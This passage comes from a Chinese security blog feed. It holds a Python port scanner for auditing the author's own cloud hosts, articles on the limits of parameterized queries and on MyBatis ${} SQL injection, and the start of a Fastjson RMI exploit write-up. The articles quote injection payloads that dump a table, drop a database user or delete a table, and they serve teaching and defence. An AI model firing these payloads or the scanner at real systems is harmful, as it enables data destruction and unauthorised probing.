class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># 华为云平台导出的数据需要进行一定的处理，换下行和列。</span><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> checkpms <span class="hljs-keyword">import</span> ip_address_list<br><span class="hljs-keyword">from</span> checkpms <span class="hljs-keyword">import</span> find_Server_Detail<br><br><span class="hljs-comment"># 获取当前主机的Ip地址。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_host_ip</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        p.connect((<span class="hljs-string">&#x27;8.8.8.8&#x27;</span>, <span class="hljs-number">80</span>))<br>        ip = p.getsockname()[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">finally</span>:<br>        p.close()<br>    <span class="hljs-keyword">return</span> ip<br><br><span class="hljs-comment"># 用于多线程的资源锁定。在这个项目中，则使用来处理写文件操作。</span><br>lock = threading.Lock()<br><span class="hljs-comment"># 存放内容</span><br>http_URL = []<br><br><span class="hljs-comment"># 网站url</span><br>http_website = []<br><span class="hljs-comment"># 每个线程分配的url</span><br>urlSepList = []<br><br>totally_ipaddress = ip_address_list()<br><br><span class="hljs-comment"># 分离文件名 给每个线程分一个</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">separateName</span>(<span class="hljs-params">threadCount</span>):</span><br>    <span class="hljs-comment"># 使用 math.ceil 函数处理了bug，向上取整，从而使得原来的IP丢失问题得到解决。</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(totally_ipaddress), math.ceil(<span class="hljs-built_in">len</span>(totally_ipaddress) / threadCount)):<br>        <span class="hljs-comment"># urlSepList 将portlist 分成了6段 ip段值，前5个每段106个IP，后一个104（threadCount=6的情况下）</span><br>        urlSepList.append(totally_ipaddress[i:i + math.ceil(<span class="hljs-built_in">len</span>(totally_ipaddress) / threadCount)])<br><br><br><span class="hljs-comment"># 多线程函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">multithreading</span>(<span class="hljs-params">threadCount,portlist2</span>):</span><br>    separateName(threadCount)  <span class="hljs-comment"># 先分离</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, threadCount - <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 运行多个单线程，构成多线程。其中参数时单线程中定应的参数。</span><br>        t = threading.Thread(target=run_one_thread, args=(urlSepList[i],portlist2))<br>        t.start()<br><br><br><span class="hljs-comment"># 每个线程的运作 ,url_list 是按照线程数分出的ip段。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_one_thread</span>(<span class="hljs-params">url_list,portlist2</span>):</span><br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> portlist2:<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始核查IP地址&quot;</span>+<span class="hljs-built_in">str</span>(url) + <span class="hljs-string">&quot;端口号为&quot;</span>, <span class="hljs-built_in">str</span>(port))<br>            ok_f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;%d&quot;</span> % port + <span class="hljs-string">&quot;-&quot;</span> + get_host_ip() + <span class="hljs-string">&quot;  port outside.csv&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>,encoding=<span class="hljs-string">&#x27;GB2312&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                s = socket.socket(AF_INET, SOCK_STREAM)<br>                s.settimeout(<span class="hljs-number">3</span>)<br>                s.connect((url, port))<br>                <span class="hljs-comment"># 多线程情况下的资源锁定。 lock.acquire()</span><br>                lock.acquire()<br>                <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&quot; is open&quot;</span> + <span class="hljs-string">&quot; %d&quot;</span> % port)<br><br>                ok_f.write(url +<span class="hljs-string">&quot;\n&quot;</span>+find_Server_Detail(url) + <span class="hljs-string">&quot;\n&quot;</span>)<br>                <span class="hljs-comment"># print(&#x27;[+] %d open&#x27; % port)</span><br>                lock.release()<br>                s.close()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-comment"># raise e</span><br>                <span class="hljs-keyword">pass</span><br>            ok_f.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    portlist = [<span class="hljs-number">80</span>,<span class="hljs-number">334</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">6379</span>]<br>    multithreading(<span class="hljs-number">50</span>,portlist)<br><br></code></pre></td></tr></table></figure><h2 id="checkpms-py-用于提供服务器IP列表和服务器详情信息返回的两个函数。"><a href="#checkpms-py-用于提供服务器IP列表和服务器详情信息返回的两个函数。" class="headerlink" title="checkpms.py 用于提供服务器IP列表和服务器详情信息返回的两个函数。"></a>checkpms.py 用于提供服务器IP列表和服务器详情信息返回的两个函数。</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># 对于本地的仓库，仅需要commit 而无需进行push.</span><br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> os<br><br>filename_list = []<br>exclude_list = [<span class="hljs-string">&quot;公网IP&quot;</span>, <span class="hljs-string">&#x27;主IPv4公网IP&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;主IPv4内网IP&#x27;</span>, <span class="hljs-string">&#x27;内网IP&#x27;</span>, <span class="hljs-string">&#x27;私有IP地址&#x27;</span>,<span class="hljs-string">&#x27;弹性公网IP&#x27;</span>]<br>path1 = <span class="hljs-string">&quot;D:\\文档\wyn\\A日常安全检查\\云平台主机端口安全检查\\ali_cloud_address\\&quot;</span><br>path2 = <span class="hljs-string">&quot;D:\\文档\\wyn\\A日常安全检查\\云平台主机端口安全检查\\tencent_cloud_address\\&quot;</span><br>path3 = <span class="hljs-string">&quot;D:\\文档\\wyn\\A日常安全检查\\云平台主机端口安全检查\\huawei_cloud_address\\&quot;</span><br><span class="hljs-comment"># path = [path1,path2,path3]</span><br><span class="hljs-comment"># path = &quot;D:\\文档\wyn\A日常安全检查\\绿云-PMS系统核查\\&quot;</span><br>PATH_LIST = [path1, path2, path3]<br><br><span class="hljs-comment"># 函数作用为对单个路径中的csv文件，形成文件列表。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_filelist</span>(<span class="hljs-params">path</span>):</span><br>    file_name = []<br>    a = os.listdir(path)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> os.path.splitext(j)[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.csv&#x27;</span>:<br>            file_name.append(j)<br>    <span class="hljs-keyword">return</span> file_name<br><br><br><span class="hljs-comment"># 函数作用为返回所有云服务器的Ip地址列表，并且输出相应的IP列表长度。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ip_address_list</span>():</span><br>    ip_list = []<br>    ip_list_inside = []<br>    filename_list = []<br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> PATH_LIST:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(find_filelist(path)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> find_filelist(path):<br>                filename_list.append(j)<br>            <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filename_list:<br>                csv_file = csv.reader(<span class="hljs-built_in">open</span>(path + filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                <span class="hljs-keyword">for</span> stu <span class="hljs-keyword">in</span> csv_file:<br>                    <span class="hljs-comment"># print(stu[11])</span><br>                    <span class="hljs-comment"># 对于华为云导出的数据中外网Ip 后面跟了带宽。如果用python 处理稍显麻烦，则用excel处理。（数据-分列-选择空格 即可）</span><br>                    <span class="hljs-comment"># 另外华为云的数据需要将公网ip 和 内弯IP换下列。</span><br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">11</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> exclude_list:<br>                         ip_list.append(stu[<span class="hljs-number">11</span>])<br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">12</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> exclude_list:<br>                        ip_list_inside.append(stu[<span class="hljs-number">12</span>])<br>            filename_list = []<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(ip_list))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(ip_list_inside))<br>    ip_list = ip_list_inside + ip_list<br><br>    <span class="hljs-keyword">return</span> (ip_list)<br><span class="hljs-comment"># 函数的作用在于当发现端口开放时，返回相应的服务器的详情数据。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_Server_Detail</span>(<span class="hljs-params">url</span>):</span><br><br>    result = <span class="hljs-literal">None</span><br>    filename_list = []<br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> PATH_LIST:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(find_filelist(path)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> find_filelist(path):<br>                filename_list.append(j)<br>            <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filename_list:<br>                csv_file = csv.reader(<span class="hljs-built_in">open</span>(path + filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                <span class="hljs-keyword">for</span> stu <span class="hljs-keyword">in</span> csv_file:<br>                    <span class="hljs-comment">#print(stu)</span><br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">11</span>] == url <span class="hljs-keyword">or</span> stu[<span class="hljs-number">12</span>] == url:<br>                        result = stu<br><br>            filename_list = []<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(find_Server_Detail(<span class="hljs-string">&#x27;88.88.88.88&#x27;</span>))<br><br><br><br></code></pre></td></tr></table></figure><h2 id="python-在性能，规范化，协作性-方面都被很多人所诟病。-希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。"><a href="#python-在性能，规范化，协作性-方面都被很多人所诟病。-希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。" class="headerlink" title="python 在性能，规范化，协作性 方面都被很多人所诟病。 希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。"></a>python 在性能，规范化，协作性 方面都被很多人所诟病。 希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用预处理的参数化查询就100%安全吗？可以杜绝所有的sql 注入吗</title>
      <link href="/2020/07/20/%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%B0%B1100-%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%8F%AF%E4%BB%A5%E6%9D%9C%E7%BB%9D%E6%89%80%E6%9C%89%E7%9A%84sql-%E6%B3%A8%E5%85%A5%E5%90%97/"/>
      <url>/2020/07/20/%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%B0%B1100-%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%8F%AF%E4%BB%A5%E6%9D%9C%E7%BB%9D%E6%89%80%E6%9C%89%E7%9A%84sql-%E6%B3%A8%E5%85%A5%E5%90%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>您必须确定许多大型复杂数据库本身就是程序。这些程序的复杂性差别很大，对于内部编程例程，必须注意SQL注入。这样的例程包括触发器，用户定义的函数，存储过程等。这些事物在应用程序级别之间如何交互并不总是很明显，因为许多好的dba在应用程序访问级别和存储级别之间提供了某种程度的抽象。<p></p><p>使用绑定的参数，将解析查询树，然后至少在PostgreSQL中，对数据进行查看以进行计划。该计划已执行。使用准备好的语句，可以保存计划，因此您可以反复使用不同的数据重新执行同一计划（这可能是您想要的，也可能不是您想要的）。但要点是，对于绑定的参数，参数无法将任何内容注入到解析树中。因此，此类SQL注入问题已得到妥善解决。</p><p>但是现在我们需要记录谁在表中写入内容，因此我们添加了触发器和用户定义的函数来封装这些触发器的逻辑。这些带来了新的问题。如果其中包含任何动态SQL，则必须担心那里存在SQL注入。他们写入的表可能具有自己的触发器，依此类推。类似地，一个函数调用可能会调用另一个查询，后者可能会调用另一个函数调用，依此类推。每一个都是独立于主树计划的。</p><p>这意味着，如果我使用类似的绑定参数运行查询，foo’; drop user postgres; –则它无法直接暗示顶级查询树并导致其添加另一个命令来删除postgres用户。但是，如果此查询是否直接调用另一个函数，则很可能在该行的某处，该函数将很容易受到攻击，而postgres用户将被丢弃。绑定参数对辅助查询不提供任何保护。这些辅助查询需要确保它们也尽可能使用绑定的参数，并且在没有使用绑定参数的情况下，需要使用适当的引用例程。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis 使用错误可能引入的SQL 注入</title>
      <link href="/2020/07/20/Mybatis-%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF%E5%8F%AF%E8%83%BD%E5%BC%95%E5%85%A5%E7%9A%84SQL-%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/07/20/Mybatis-%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF%E5%8F%AF%E8%83%BD%E5%BC%95%E5%85%A5%E7%9A%84SQL-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://www.buhuixiu.com/images/1_lrLeZiGU4eA45R3ssjOY7Q.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/1_lrLeZiGU4eA45R3ssjOY7Q.png"></a><p></p><p>众所周知，MyBatis 的数据地图映射方式，使得我们在面向对象编程中，更加轻松的使用关系型数据库。<br>与传统的ORM解决方案不同，Mybatis maps 对象利用XML描述 SQL声明或者存储过程。这种使用方式提供了<br>完整的控制SQL。但是，如果不正确的使用，仍然会存在sql 注入的问题。</p><h1 id="安全使用方式"><a href="#安全使用方式" class="headerlink" title="安全使用方式"></a>安全使用方式</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;select id=<span class="hljs-string">&quot;getPerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span> resultType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>SELECT * FROM PERSON WHERE ID = #&#123;id&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>使用 # {}方式，使得Mybatis 使用 PreparedStatment parameters(e.g?)  使得值变得安全。相当于下面的使用方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* Comparable JDBC code */</span><br>String selectPerson = <span class="hljs-string">&quot;SELECT * FROM PERSON WHERE ID = ?&quot;</span>; <br>PreparedStatement ps = conn.prepareStatement(selectPerson); <br>ps.setInt(<span class="hljs-number">1</span>, id);<br></code></pre></td></tr></table></figure><p>这样SQL 注入得到了防护。<br>下面是几个类似的安全的使用方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;insert id=<span class="hljs-string">&quot;insertPerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br><span class="hljs-function">insert into <span class="hljs-title">Person</span> <span class="hljs-params">(id, name, email, phone)</span></span><br><span class="hljs-function"><span class="hljs-title">values</span> <span class="hljs-params">(#&#123;id&#125;, #&#123;name&#125;, #&#123;email&#125;, #&#123;phone&#125;)</span></span><br><span class="hljs-function">&lt;/insert&gt;</span><br><span class="hljs-function"> </span><br><span class="hljs-function">&lt;update id</span>=<span class="hljs-string">&quot;updatePerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>update Person set name = #&#123;name&#125;, email = #&#123;email&#125;, phone = #&#123;phone&#125;<br>where id = #&#123;id&#125;<br>&lt;/update&gt;<br> <br> <br>&lt;delete id=<span class="hljs-string">&quot;deletePerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span>&gt;<br>delete from Person where id = #&#123;id&#125;<br>&lt;/delete&gt;<br></code></pre></td></tr></table></figure><h1 id="不安全的使用方式"><a href="#不安全的使用方式" class="headerlink" title="不安全的使用方式"></a>不安全的使用方式</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;select id=<span class="hljs-string">&quot;getPerson&quot;</span> parameterType=<span class="hljs-string">&quot;string&quot;</span> resultType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>SELECT * FROM PERSON WHERE NAME = #&#123;name&#125; AND PHONE LIKE <span class="hljs-string">&#x27;$&#123;phone&#125;&#x27;</span>; <br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>默认情况下，使用 ${}方式，Mybatis 会直接拼接SQL语句。 Mybatis 不会修改或者过滤字符在应用到拼接SQL语句中前。<br>假设phone 是一个用户可以控制的值，同时，没有进行数据有效性校验和恰当的字符过滤，那么攻击者可以输入一个字符payload<br>例如： “1%‘ OR ‘1’ = ‘1” for phone; 如下。这个查询将返回PERSON 表的所有行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM PERSON WHERE NAME = ? and PHONE LIKE <span class="hljs-string">&#x27;1%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p>也可以使用如下的payload ，删除PERSON 表。（适用于特定的关系型数据库） SQLSERVEER OR MYSQL ?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM PERSON WHERE NAME = ? and PHONE LIKE <span class="hljs-string">&#x27;A%&#x27;</span>; DELETE FROM PERSON; --<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>下面的这些，都是不安全的使用范例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;insert id=<span class="hljs-string">&quot;insertPerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br><span class="hljs-function">insert into <span class="hljs-title">Person</span> <span class="hljs-params">(id, name, email, phone)</span></span><br><span class="hljs-function"><span class="hljs-title">values</span> <span class="hljs-params">(#&#123;id&#125;, #&#123;name&#125;, #&#123;email&#125;, $&#123;phone&#125;)</span></span><br><span class="hljs-function">&lt;/insert&gt;</span><br><span class="hljs-function"> </span><br><span class="hljs-function">&lt;update id</span>=<span class="hljs-string">&quot;updatePerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>update Person set phone = $&#123;phone&#125;<br>where id = #&#123;id&#125;<br>&lt;/update&gt;<br> <br> <br>&lt;delete id=<span class="hljs-string">&quot;deletePerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span>&gt;<br>delete from Person where id = $&#123;id&#125;<br>&lt;/delete&gt;<br></code></pre></td></tr></table></figure><h1 id="总之，不要使用-方式，在mybatis的xml文件中写查询。。"><a href="#总之，不要使用-方式，在mybatis的xml文件中写查询。。" class="headerlink" title="总之，不要使用 ${} 方式，在mybatis的xml文件中写查询。。"></a>总之，不要使用 ${} 方式，在mybatis的xml文件中写查询。。</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java jndi注入-远程命令执行漏洞-3-如何绕过高版本jdk(8u191)</title>
      <link href="/2020/07/07/Java-JNDI%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk-8u-191%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC/"/>
      <url>/2020/07/07/Java-JNDI%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk-8u-191%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" < div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script></div>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson-1-2-47-远程命令执行漏洞-2</title>
      <link href="/2020/07/07/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-2-RMI%E5%92%8CLDAP%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>/2020/07/07/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-2-RMI%E5%92%8CLDAP%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h2 id="可以看到我们前面用的payload-发送方式，是RMI-（Remote-Method-Invocation-方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk-8u102-版本可以顺利的跑起来计算器，而-jdk-8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。"><a href="#可以看到我们前面用的payload-发送方式，是RMI-（Remote-Method-Invocation-方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk-8u102-版本可以顺利的跑起来计算器，而-jdk-8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。" class="headerlink" title="可以看到我们前面用的payload 发送方式，是RMI （Remote Method Invocation) 方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk:8u102 版本可以顺利的跑起来计算器，而 jdk:8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。"></a>可以看到我们前面用的payload 发送方式，是RMI （Remote Method Invocation) 方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk:8u102 版本可以顺利的跑起来计算器，而 jdk:8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。<p><a href="https://www.buhuixiu.com/images/jdk102-%E5%85%A8%E5%9B%BE%E8%BF%90%E8%A1%8C.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk102-%E5%85%A8%E5%9B%BE%E8%BF%90%E8%A1%8C.png"></a></p><div><p><a href="https://www.buhuixiu.com/images/jdk-8u-102.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk-8u-102.png" width="70%" height="70%"></a></p><p><a href="https://www.buhuixiu.com/images/jdk181.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk181.png" width="70%" height="70%"></a></p></div>通过参考一些帖子，相应的较新版本的jdk都有了针对RMI方式的防御，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。<span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 